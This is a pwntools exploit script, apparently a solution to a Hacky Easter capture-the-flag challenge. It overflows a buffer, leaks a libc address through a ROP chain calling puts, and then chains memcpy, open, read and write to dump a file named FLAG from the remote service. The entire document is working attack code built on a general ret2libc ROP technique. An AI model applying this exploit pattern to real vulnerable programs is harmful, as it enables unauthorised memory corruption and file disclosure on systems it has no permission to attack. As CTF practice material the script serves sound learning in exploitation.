from pwn import *

# https://www.youtube.com/watch?v=i5-cWI_HV8o

context.arch = "amd64"
offset = 40

is_remote = False

elf = ELF("main")
if is_remote:
	p = remote("ch.hackyeaster.com", 2314)
else:
	p = elf.process()

## finding where the libc is ##

rop = ROP(elf)
rop.call("puts", [ elf.got["puts"] ])
rop.call("vuln")

print(p.recvuntil(b"\n"))
print(p.recvuntil(b": "))

payload = [
	b"A"*offset,
	rop.chain()
]

print("sending payload:", payload)

payload = b"".join(payload)
p.sendline(payload)

puts = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
print("we found puts at:", hex(puts))

## final payload ##

if is_remote:
	libc = ELF("libc6_2.27-3ubuntu1.6_amd64.so")
else:
	libc = elf.libc

libc.address = puts - libc.symbols["puts"]
print("libc base address:", hex(libc.address))

letterF = next(libc.search(b'F'))
print("letter F found at:", hex(letterF))
letterL = next(libc.search(b'L'))
print("letter L found at:", hex(letterL))
letterA = next(libc.search(b'A'))
print("letter A found at:", hex(letterA))
letterG = next(libc.search(b'G'))
print("letter G found at:", hex(letterG))
letterNul = next(libc.search(b'\x00'))
print("letter NUL found at:", hex(letterNul))

memory = elf.bss(0x40)

rop = ROP(libc)

rop.call("memcpy", [ memory, letterF, 1 ])
rop.call("memcpy", [ memory+1, letterL, 1 ])
rop.call("memcpy", [ memory+2, letterA, 1 ])
rop.call("memcpy", [ memory+3, letterG, 1 ])
rop.call("memcpy", [ memory+4, letterNul, 1 ])

rop.call("open", [ memory, 0, 0 ])
rop.call("read", [ 3, memory, 256 ])
rop.call("write", [ 1, memory, 256 ])
rop.call("exit", [ 0 ])

print(rop.dump())

print(p.recvuntil(b"\n"))
print(p.recvuntil(b": "))

payload = [
	b"A"*offset,
	rop.chain()
]

print("sending payload:", payload)

payload = b"".join(payload)
p.sendline(payload)

p.interactive()
